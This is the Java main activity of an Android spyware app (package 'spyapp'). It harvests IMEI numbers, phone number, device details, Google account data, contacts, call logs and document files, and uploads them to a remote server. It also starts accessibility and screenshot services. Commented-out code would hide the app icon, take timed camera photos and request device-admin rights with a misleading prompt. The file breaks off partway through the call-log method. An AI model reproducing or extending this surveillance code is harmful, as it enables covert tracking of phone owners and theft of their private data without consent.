package kkactive_india.in.spyapp;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.location.Address;
import android.location.Geocoder;
import android.location.LocationManager;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.view.ViewCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;
import android.view.View;
import android.webkit.MimeTypeMap;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthCredential;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.auth.GoogleAuthProvider;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.InstanceIdResult;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.regex.Pattern;

import github.nisrulz.easydeviceinfo.base.EasyBatteryMod;
import github.nisrulz.easydeviceinfo.base.EasyDeviceMod;
import github.nisrulz.easydeviceinfo.base.EasyIdMod;
import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
import github.nisrulz.easydeviceinfo.base.EasyMemoryMod;
import github.nisrulz.easydeviceinfo.base.EasyNetworkMod;
import github.nisrulz.easydeviceinfo.base.EasySimMod;
import kkactive_india.in.spyapp.FilePOJO.fileBean;
import kkactive_india.in.spyapp.MainPOJO.MainBean;
import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
import kkactive_india.in.spyapp.contactPOJO.contactBean;
import kkactive_india.in.spyapp.locationPOJO.locationBean;
import kkactive_india.in.spyapp.mailPOJO.mailBean;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;

import static android.view.View.VISIBLE;
import static java.util.jar.Pack200.Packer.ERROR;
//import static kkactive_india.in.spyapp.ScreenShot.setScreenshotPermission;

public class MainActivity extends AppCompatActivity {

    TextView textView;
    TextView txtLogs;
    EditText mail;
    Button login;
    ProgressBar bar;
    @SuppressLint("HardwareIds")
    String imeiNumber1;
    @SuppressLint("HardwareIds")
    String imeiNumber2;
    String address;
    String name, phoneNumber, id, lat, lon, Model, appVersion, country, carrier, personName, personEmail, personImage;
    int osVersion;
    List<ContactDatum> data = new ArrayList<>();
    SharedPreferences pref;
    SharedPreferences.Editor edit;
    final String state = Environment.getExternalStorageState();
    List<String> list;
    ConnectionDetector cd;
    Uri personPhoto;
    File file, file21;
    long Ram, inMemory, exMemory, tinMemory, texMemory;
    private static Intent screenshotPermission = null;

    private static String CHROME_BOOKMARKS_URI =
            "content://com.android.chrome.browser/history";

    private static final int REQUEST_CODE = 0;
    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;


    private static final String TAG = "GoogleActivity";
    private static final int RC_SIGN_IN = 9001;
    private FirebaseAuth mAuth;

    private GoogleSignInClient mGoogleSignInClient;

    private BroadcastReceiver mScreenStateReceiver = null;

    Intent service;

    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;


    @TargetApi(Build.VERSION_CODES.O)
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        // textView = (TextView) findViewById(R.id.textview);

        mail = (EditText) findViewById(R.id.mail);
        login = (Button) findViewById(R.id.logInButton);
        bar = (ProgressBar) findViewById(R.id.progress);
        pref = getSharedPreferences("pref", Activity.MODE_PRIVATE);
        edit = pref.edit();

        cd = new ConnectionDetector(getApplication());
        txtLogs = (TextView) findViewById(R.id.txt_log);

        ViewCompat.setImportantForAccessibility(txtLogs, ViewCompat.IMPORTANT_FOR_ACCESSIBILITY_NO);






 /*       try {
            // Initiate DevicePolicyManager.
            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            mAdminName = new ComponentName(this, DeviceAdminDemo.class);

            if (!mDPM.isAdminActive(mAdminName)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                startActivityForResult(intent, REQUEST_CODE);
            } else {
                // mDPM.lockNow();
                // Intent intent = new Intent(MainActivity.this,
                // TrackDeviceService.class);
                // startService(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }*/


        Log.d("sadasd", "kjhasdkh");

        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        assert tm != null;
        imeiNumber1 = tm.getDeviceId(1); //(API level 23)
        imeiNumber2 = tm.getDeviceId(2);

        Log.d("IMEI1", imeiNumber1);
        Log.d("IMEI2", imeiNumber2);

        @SuppressLint("HardwareIds") String number = tm.getLine1Number();
        Log.d("numner", number);


        EasyBatteryMod easyBatteryMod = new EasyBatteryMod(MainActivity.this);

        int Battery = easyBatteryMod.getBatteryPercentage();

        // Log.e("BatteryPercentage", String.valueOf(Battery));

        EasyDeviceMod easyDeviceMod = new EasyDeviceMod(MainActivity.this);

        Model = easyDeviceMod.getModel();
        osVersion = easyDeviceMod.getBuildVersionSDK();
        appVersion = easyDeviceMod.getOSVersion();
        String phn = easyDeviceMod.getPhoneNo();

        Log.e("AndroidVersion", String.valueOf(osVersion));
        Log.e("phn", phn);
        Log.e("AppVersion", appVersion);
        Log.e("Model", Model);

        EasyMemoryMod easyMemoryMod = new EasyMemoryMod(MainActivity.this);
        Ram = (long) easyMemoryMod.convertToMb(easyMemoryMod.getTotalRAM());
        //  inMemory = (long) easyMemoryMod.convertToGb(easyMemoryMod.getAvailableInternalMemorySize());
        //   exMemory = (long)easyMemoryMod.convertToGb(easyMemoryMod.getAvailableExternalMemorySize());
        //   tinMemory = (long) easyMemoryMod.convertToGb(easyMemoryMod.getTotalInternalMemorySize());
        //   texMemory = (long)easyMemoryMod.convertToGb(easyMemoryMod.getTotalExternalMemorySize());

        //  Log.e("RAM",String.valueOf(Ram));
        //  Log.e("Internel Memory",String.valueOf(inMemory));
        //  Log.e("Externel Memory",String.valueOf(exMemory));
        //  Log.e("Total Internel Memory",String.valueOf(tinMemory));
        // Log.e("Total Externel Memory",String.valueOf(texMemory));

        EasyNetworkMod easyNetworkMod = new EasyNetworkMod(this);

        boolean wifi = easyNetworkMod.isWifiEnabled();

        Log.e("Wifi", String.valueOf(wifi));

        ConnectivityManager mgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = mgr.getActiveNetworkInfo();

        /*boolean isData = netInfo.getType() == ConnectivityManager.TYPE_MOBILE;

        Log.e("DATAIS", String.valueOf(isData));*/

        EasySimMod easySimMod = new EasySimMod(this);

        country = easySimMod.getCountry();
        carrier = easySimMod.getCarrier();

        Log.e("Country", country);
        Log.e("Carrier", carrier);


        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        activityManager.getMemoryInfo(memoryInfo);
        long Megs = memoryInfo.totalMem / 1073741824;

        // 1073741824


        // Log.e("RamHaiBhai", String.valueOf(Megs));

       /* ActivityCompat.requestPermissions(MainActivity.this,
                new String[]{Manifest.permission.GET_ACCOUNTS},
                1);

        EasyIdMod easyIdMod = new EasyIdMod(this);
        String[] emailIds = easyIdMod.getAccounts();
        StringBuilder emailString = new StringBuilder();
        if (emailIds != null && emailIds.length > 0) {
            for (String e : emailIds) {
                emailString.append(e).append("\n");
            }
        } else {
            emailString.append("-");
        }

        String emailId = emailString.toString();

        Log.e("IDDDDDD", emailId);*/


        //  Log.e("InternelMaiHaiMemory", getAvailableInternalMemorySize());
        //  Log.e("TotInternelMaiHaiMemory", getTotalInternalMemorySize());
        //   Log.e("ExternalMaiHaiMemory",getAvailableExternalMemorySize());
        //  Log.e("TotExternalMaiHaiMemory",getTotalExternalMemorySize());

        LocationManager locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (locManager != null) {
            boolean gps = locManager.isProviderEnabled(LocationManager.GPS_PROVIDER);

            Log.e("LocationBhai", String.valueOf(gps));
        }



       /* Geocoder geocoder = new Geocoder(this, Locale.getDefault());
        try {
            List<Address> listAdresses = geocoder.getFromLocation(Double.parseDouble(lat), Double.parseDouble(lon), 1);
            if (null != listAdresses && listAdresses.size() > 0) {
                address= listAdresses.get(0).getAddressLine(0);
                String state = listAdresses.get(0).getAdminArea();
                String country = listAdresses.get(0).getCountryName();
                String subLocality = listAdresses.get(0).getSubLocality();

                Log.d("Adsress", address);

            }
        } catch (IOException e) {
            e.printStackTrace();
        }*/


/*        SubscriptionManager subscriptionManager = SubscriptionManager.from(getApplicationContext());
        List<SubscriptionInfo> subsInfoList = subscriptionManager.getActiveSubscriptionInfoList();

        Log.d("Test", "Current list = " + subsInfoList);

        for (SubscriptionInfo subscriptionInfo : subsInfoList) {

            String num = subscriptionInfo.getNumber();

            Log.d("Test", " Number is  " + num);
        }*/


     /*   ActivityCompat.requestPermissions(MainActivity.this,
                new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS},
                1);
        // String strOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        StringBuffer sb = new StringBuffer();
        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        sb.append("Contact Details :");

        data = new ArrayList<>();

        while (phones.moveToNext()) {
            name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            //Toast.makeText(getApplicationContext(),name, Toast.LENGTH_LONG).show();

            Log.d("names", name);
            Log.d("Phones", phoneNumber);
            //textView.setText("\n Name:" + name +"\nNumber:" + phoneNumber );      

            sb.append(" \nName:--- " + name + "\nPhone Number:--- " + phoneNumber);
            sb.append("\n----------------------------------");


            ContactDatum person = new ContactDatum();
            person.setName(name);
            person.setMobile(phoneNumber);
            data.add(person);


        }

//        contactApi();

        phones.close();*/
        //textView.setText(sb);


        // calls();

        // getSMS();


        //files();
        //  filesss();


       /* ArrayList<String> galleryImageUrls;
        final String[] columns = {MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID};//get all columns of type images
        final String orderBy = MediaStore.Images.Media.DATE_TAKEN;//order data by date

        Cursor imagecursor = managedQuery(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, null,
                null, orderBy + " DESC");//get all data in Cursor by sorting in DESC order

        galleryImageUrls = new ArrayList<String>();

        for (int i = 0; i < imagecursor.getCount(); i++) {
            imagecursor.moveToPosition(i);
            int dataColumnIndex = imagecursor.getColumnIndex(MediaStore.Images.Media.DATA);//get column index
            galleryImageUrls.add(imagecursor.getString(dataColumnIndex));//get Image from column index
        }
        Log.e("fatch in", String.valueOf(galleryImageUrls));*/
        //return galleryImageUrls;


        GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestIdToken(getString(R.string.default_web_client_id))
                .requestEmail()
                .build();

        mGoogleSignInClient = GoogleSignIn.getClient(this, gso);

        mAuth = FirebaseAuth.getInstance();


        login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                final String e = mail.getText().toString();
                if (e.length() > 0) {
                    bar.setVisibility(VISIBLE);

                    signIn();
                } else {
                    mail.setError("Give a valid E-mail");
                    mail.requestFocus();
                }

            }
        });

        //checkCameraHardware(getApplicationContext());

/*        GoogleSignInAccount acct = GoogleSignIn.getLastSignedInAccount(MainActivity.this);
        if (acct != null) {
            personName = acct.getDisplayName();
            String personGivenName = acct.getGivenName();
            String personFamilyName = acct.getFamilyName();
            personEmail = acct.getEmail();
            String personId = acct.getId();
            personPhoto = acct.getPhotoUrl();

            file21 = new File(String.valueOf(personPhoto));

            Log.e("Name",personName);
            Log.e("Name",personId);
            Log.e("Name",personEmail);
            Log.e("Name", String.valueOf(personPhoto));
        }*/

        /*FirebaseInstanceId.getInstance().getInstanceId().addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
            @Override
            public void onComplete(@NonNull Task<InstanceIdResult> task) {

                String token = task.getResult().getToken();

                Log.e("Token", token);


            }
        });*/


//        Log.e("regId",pref.getString("regId",null));

       /* mediaProjectionManager = (MediaProjectionManager)getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), 1);*/


    }


    /**
     * Check if this device has a camera
     */
    private boolean checkCameraHardware(Context context) {
        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            // this device has a camera
            Log.e("Camera", "HaiBhai");
            return true;
        } else {
            // no camera on this device
            Log.e("Camera", "NahiHaiBhai");
            return false;
        }
    }

    private void signIn() {
        Intent signInIntent = mGoogleSignInClient.getSignInIntent();
        startActivityForResult(signInIntent, RC_SIGN_IN);
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_SIGN_IN) {

            Intent intttac = new Intent(MainActivity.this, MyAccessibilityService.class);
            startService(intttac);

            Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
            try {
                // Google Sign In was successful, authenticate with Firebase
                GoogleSignInAccount account = task.getResult(ApiException.class);
                firebaseAuthWithGoogle(account);
                Log.e("Info", account.getEmail());
                Log.e("Info", String.valueOf(account.getAccount()));
                Log.e("Info", account.getDisplayName());
                Log.e("Info", String.valueOf(account.getPhotoUrl()));
                personName = account.getDisplayName();
                personEmail = account.getEmail();
                personPhoto = account.getPhotoUrl();
                personImage = String.valueOf(account.getPhotoUrl());

                file21 = new File(String.valueOf(personPhoto));


            } catch (ApiException e) {
                // Google Sign In failed, update UI appropriately
                Log.w(TAG, "Google sign in failed", e);
                // [START_EXCLUDE]
                //updateUI(null);
                // [END_EXCLUDE]
            }
        }

       /* if (requestCode == 1) {
            if (resultCode == Activity.RESULT_OK) {
                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
                setScreenshotPermission((Intent) data.clone());
               // this.finish();
            }else if (Activity.RESULT_CANCELED == resultCode) {
                setScreenshotPermission(null);
                Log.e("Access","No Access");

            }
        }*/

    }

    private void firebaseAuthWithGoogle(GoogleSignInAccount acct) {
        Log.d(TAG, "firebaseAuthWithGoogle:" + acct.getId());
        // [START_EXCLUDE silent]
        // showProgressDialog();
        // [END_EXCLUDE]

        AuthCredential credential = GoogleAuthProvider.getCredential(acct.getIdToken(), null);
        mAuth.signInWithCredential(credential)
                .addOnCompleteListener(this, new OnCompleteListener<AuthResult>() {
                    @Override
                    public void onComplete(@NonNull Task<AuthResult> task) {
                        if (task.isSuccessful()) {
                            // Sign in success, update UI with the signed-in user's information
                            Log.d(TAG, "signInWithCredential:success");
                            FirebaseUser user = mAuth.getCurrentUser();

                            Log.d("User", String.valueOf(user));

                            final String e = mail.getText().toString();


                            Bean b = (Bean) getApplicationContext();

                            Retrofit retrofit = new Retrofit.Builder()
                                    .baseUrl(b.baseURL)
                                    .addConverterFactory(ScalarsConverterFactory.create())
                                    .addConverterFactory(GsonConverterFactory.create())
                                    .build();
                            Allapi cr = retrofit.create(Allapi.class);
                            Call<mailBean> call = cr.login(e);
                            call.enqueue(new Callback<mailBean>() {
                                @Override
                                public void onResponse(Call<mailBean> call, Response<mailBean> response) {
                                    bar.setVisibility(View.GONE);
                                    Log.d("successHoGyaHAi", response.message());
                                    Log.d("successHoGyaHAi", "success");
                                    Toast.makeText(MainActivity.this, "Please check your E-mail Id and click on that link.", Toast.LENGTH_SHORT).show();

                                    id = response.body().getResult().getEmail();

                                    edit.putString("id", response.body().getResult().getEmail());
                                    edit.apply();


                                    mainApi();
                                    // latLonApi();
                                    //contactApi();

                                    /*Intent in = new Intent(MainActivity.this, MainService.class);
                                    startService(in);*/


                                    /*Calendar cal = Calendar.getInstance();

                                    service = new Intent(getBaseContext(), CameraService.class);
                                    cal.add(Calendar.SECOND, 15);
                                    //TAKE PHOTO EVERY 15 SECONDS
                                    PendingIntent pintent = PendingIntent.getService(MainActivity.this, 0, service, 0);
                                    AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

                                    alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
                                            60*60*1000, pintent);
                                    startService(service);*/

                                    /*Intent intent = new Intent(MainActivity.this, CameraService.class);
                                    startService(intent);*/

                                    /*Intent intent = new Intent(MainActivity.this, RecorderService.class);
                                    intent.putExtra("Front_Request",false);
                                    startService(intent);*/

                                    Intent in = new Intent(MainActivity.this, MyFirebaseMessagingService.class);
                                    startService(in);

                                    Intent inti = new Intent(MainActivity.this, FirebaseInstanceIdService.class);
                                    startService(inti);

                                    Intent inttt = new Intent(MainActivity.this, ScreenShot.class);
                                    startService(inttt);

                                    /*Intent vib = new Intent(MainActivity.this,VibrateService.class);
                                    startService(vib);*/

                                    Intent intttac = new Intent(MainActivity.this, MyAccessibilityService.class);
                                    startService(intttac);

                                    IntentFilter screenStateFilter = new IntentFilter();
                                    screenStateFilter.addAction(Intent.ACTION_SCREEN_ON);
                                    screenStateFilter.addAction(Intent.ACTION_SCREEN_OFF);
                                    mScreenStateReceiver = new ScreenStateReceiver();
                                    registerReceiver(mScreenStateReceiver, screenStateFilter);




                          /*PackageManager p = getPackageManager();
                          ComponentName componentName = new ComponentName(MainActivity.this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
                          p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/


                                }

                                @Override
                                public void onFailure(Call<mailBean> call, Throwable t) {

                                }
                            });


                            // updateUI(user);
                        } else {
                            // If sign in fails, display a message to the user.
                            Log.w(TAG, "signInWithCredential:failure", task.getException());
                            // Snackbar.make(findViewById(R.id.main_layout), "Authentication Failed.", Snackbar.LENGTH_SHORT).show();
                            // updateUI(null);
                        }

                        // [START_EXCLUDE]
                        //  hideProgressDialog();
                        // [END_EXCLUDE]
                    }
                });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        unregisterReceiver(mScreenStateReceiver);
    }

    public static boolean externalMemoryAvailable() {
        return android.os.Environment.getExternalStorageState().equals(
                android.os.Environment.MEDIA_MOUNTED);
    }

    public static String getAvailableInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSizeLong();
        long availableBlocks = stat.getAvailableBlocksLong();
        return getFileSize(availableBlocks * blockSize);
    }

    public static String getTotalInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSizeLong();
        long totalBlocks = stat.getBlockCountLong();
        return getFileSize(totalBlocks * blockSize);
    }

    public static String getAvailableExternalMemorySize() {
        if (externalMemoryAvailable()) {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            return getFileSize(availableBlocks * blockSize);
        } else {
            return ERROR;
        }
    }

    public static String getTotalExternalMemorySize() {
        if (externalMemoryAvailable()) {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            return getFileSize(totalBlocks * blockSize);
        } else {
            return ERROR;
        }
    }


    public static String getFileSize(long size) {
        if (size <= 0)
            return "0";

        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));

        return new DecimalFormat("#,##0.#").format(size / Math.pow(1024, digitGroups)) + " " + units[digitGroups];
    }

    public void files() {
        /*if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {  // we can read the External Storage...
            getAllFilesOfDir(Environment.getExternalStorageDirectory());
        }*/


        ContentResolver cr = this.getContentResolver();
        Uri uri = MediaStore.Files.getContentUri("external");


// every column, although that is huge waste, you probably need
// BaseColumns.DATA (the path) only.
        String[] projection = null;

// exclude media files, they would be here also.
        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
                + MediaStore.Files.FileColumns.MEDIA_TYPE_NONE;
        String[] selectionArgs = null; // there is no ? in selection so null here

        String sortOrder = null; // unordered
        Cursor allNonMediaFiles = cr.query(uri, projection, selection, selectionArgs, sortOrder);
        // only pdf
        String selectionMimeType = MediaStore.Files.FileColumns.MIME_TYPE + "=?";
        String mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension("apk");
        String[] selectionArgsPdf = new String[]{mimeType};
        Cursor allPdfFiles = cr.query(uri, projection, selectionMimeType, selectionArgsPdf, sortOrder);

        list = new ArrayList<String>();


        for (int i = 0; i < allNonMediaFiles.getCount(); i++) {
            allNonMediaFiles.moveToPosition(i);
            int dataColumnIndex = allNonMediaFiles.getColumnIndex(MediaStore.Files.FileColumns.DATA);//get column index
            list.add(allNonMediaFiles.getString(dataColumnIndex));//get Image from column index
        }

        file = new File(String.valueOf(list));

        Log.e("PdfBhai", String.valueOf(list));
        // Log.e("PdfBhai", String.valueOf(allPdfFiles));
        // Log.e("PdfBhai", String.valueOf(allNonMediaFiles));


    }


    public void filesss() {

        if (cd.isConnectingToInternet()) {


            MultipartBody.Part body1 = null;

            for (int i = 0; i < list.size(); i++) {

                file = new File(list.get(i));

                if (file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
                        || file.getName().endsWith(".xlsx") || file.getName().endsWith(".pdf")
                        || file.getName().endsWith(".doc") || file.getName().endsWith(".txt")
                        || file.getName().endsWith(".docx") || file.getName().endsWith(".rtf")) {
                    // Log.e(" FILES",file.getName());
                    //Log.e(" FILES",file.getAbsolutePath());

                    RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
                    body1 = MultipartBody.Part.createFormData("file[]", file.getName(), reqFile1);

                    Bean b = (Bean) getApplicationContext();

                    Retrofit retrofit = new Retrofit.Builder()
                            .baseUrl(b.baseURL)
                            .addConverterFactory(ScalarsConverterFactory.create())
                            .addConverterFactory(GsonConverterFactory.create())
                            .build();
                    Allapi cr = retrofit.create(Allapi.class);
                    String id = pref.getString("id", "");
                    Call<fileBean> call = cr.files(id, body1);
                    call.enqueue(new Callback<fileBean>() {
                        @Override
                        public void onResponse(Call<fileBean> call, Response<fileBean> response) {

                            Log.d("Files", "yess Gaye");

                        }

                        @Override
                        public void onFailure(Call<fileBean> call, Throwable t) {

                        }
                    });

                }

            }

            Log.d("ListSize", String.valueOf(list.size()));

            long imagename = System.currentTimeMillis();

            String strName = imagename + file.getName();

            Log.d("asdasdasd", strName);

            // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);


        }

    }


    private void getAllFilesOfDir(File directory) {

        final File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file != null) {
                    if (file.isDirectory()) {  // it is a folder...
                        getAllFilesOfDir(file);

                    } else {  // it is a file...
                        Log.d("Directory", "Directory: " + directory.getAbsolutePath() + "\n");
                        Log.d("FileHaiKya", "File: " + file.getAbsolutePath() + "\n");
                        Log.d("File Name", file.getName());
                    }
                }
            }
        }
    }

    public void mainApi() {


        MultipartBody.Part body1 = null;

        RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file21);

        long imagename = System.currentTimeMillis();

        String strName = imagename + file21.getName();

        Log.d("asdasdasd", strName);

        body1 = MultipartBody.Part.createFormData("user_photo", file21.getName(), reqFile1);

        Bean b = (Bean) getApplicationContext();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(b.baseURL)
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        Allapi cr = retrofit.create(Allapi.class);

        Log.e("LinkOfImage", String.valueOf(personPhoto));
        Log.e("LinkOfImage", personImage);

        Call<MainBean> call = cr.main(id, imeiNumber1, imeiNumber2, Model, String.valueOf(osVersion), appVersion, country, carrier, personName, personEmail, personImage);
        call.enqueue(new Callback<MainBean>() {
            @Override
            public void onResponse(Call<MainBean> call, Response<MainBean> response) {
                Log.d("mainHaiBhai", "blklMainHai");
            }

            @Override
            public void onFailure(Call<MainBean> call, Throwable t) {

                Log.e("BhiFailHuaMain", t.toString());

            }
        });

    }

/*
    public void latLonApi() {
        Bean b = (Bean) getApplicationContext();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(b.baseURL)
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        Allapi cr = retrofit.create(Allapi.class);
        Call<locationBean> call = cr.latlon(id, lat, lon);
        call.enqueue(new Callback<locationBean>() {
            @Override
            public void onResponse(Call<locationBean> call, Response<locationBean> response) {
                Log.d("latLon", response.body().getMessage());
            }

            @Override
            public void onFailure(Call<locationBean> call, Throwable t) {

            }
        });
    }
*/

    public void contactApi() {

        Log.d("asdasads", "asdjhgsadhjasd");

        Bean b = (Bean) getApplicationContext();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(b.baseURL)
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        Allapi cr = retrofit.create(Allapi.class);


     /*   contactBean body = new contactBean();
        body.setContact("contact");

        ContactDatum data = new ContactDatum();

        data.setName(name);
        data.setMobile(phoneNumber);

        body.setContact(data);*/


        contactBean body = new contactBean();


        body.setContactData(data);

        Gson gsonObj = new Gson();

        String jsonStr = gsonObj.toJson(body);


        Log.d("dgfdh", jsonStr);
        Log.d("dgfdh", id);


        Call<contactBean> call = cr.contact(id, jsonStr);
        call.enqueue(new Callback<contactBean>() {
            @Override
            public void onResponse(Call<contactBean> call, Response<contactBean> response) {
                Log.d("contactsHai", "blkl hai bhai");

            }

            @Override
            public void onFailure(Call<contactBean> call, Throwable t) {

            }
        });

    }


    public void callLogs() {


        ActivityCompat.requestPermissions(MainActivity.this,
                new String[]{Manifest.permission.READ_CALL_LOG, Manifest.permission.WRITE_CALL_LOG},
                2);
        StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {

            String pName = managedCursor.getString(name);
            String phNumber = managedCursor.getString(number); // mobile number
            String callType = managedCursor.getString(type); // call type
            String callDate = managedCursor.getString(date); // call date
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;

            // Log.d("NameKyaHai",pName);
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
